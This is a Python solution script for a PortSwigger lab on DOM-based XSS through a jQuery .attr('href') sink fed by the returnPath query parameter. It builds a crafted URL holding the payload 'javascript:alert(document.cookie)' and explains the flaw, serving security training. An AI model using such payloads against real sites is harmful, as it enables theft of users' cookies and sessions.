# Lab 05 — DOM XSS in jQuery anchor href attribute sink using location.search source
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
#
# Vulnerability: "Back" link on /feedback page — jQuery .attr() sink
# Aim:           Make the back link call alert(document.cookie)
#
# Technique:
#   jQuery reads the returnPath URL parameter and sets it as the back link href:
#     $('#backLink').attr("href", new URLSearchParams(location.search).get('returnPath'));
#
#   Injecting javascript: into returnPath makes it a clickable XSS link:
#     <a id="backLink" href="javascript:alert(document.cookie)">Back</a>
#
#   The victim must click the link — this is an interaction-dependent DOM XSS.
#   In bug bounty, rate this as medium (requires click) not critical.
#
# ⚠  The href is set by jQuery client-side. requests cannot verify JS execution.
#    We print the crafted URL for manual browser testing.
#
# Usage: python xss_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, print_step

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "javascript:alert(document.cookie)"

if __name__ == "__main__":
    banner()
    section("LAB 05 — DOM XSS: jQuery href SINK / location.search SOURCE")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    crafted = f"{url}/feedback?returnPath={PAYLOAD}"

    # Confirm the /feedback page loads (the href is set client-side, not in HTML)
    r = session.get(f"{url}/feedback", params={"returnPath": PAYLOAD})
    print(f"  ➜  Fetched /feedback page (status {r.status_code})")
    print(f"  ℹ  jQuery sets the href client-side — cannot verify via requests.\n")

    print_step("Open this URL in a browser, then click the 'Back' link:")
    print(f"     {crafted}")
    print()
    print("  ➜  Clicking 'Back' executes: javascript:alert(document.cookie)")
    print("  ℹ  The href= attribute accepts javascript: URIs — never trust returnPath params.")
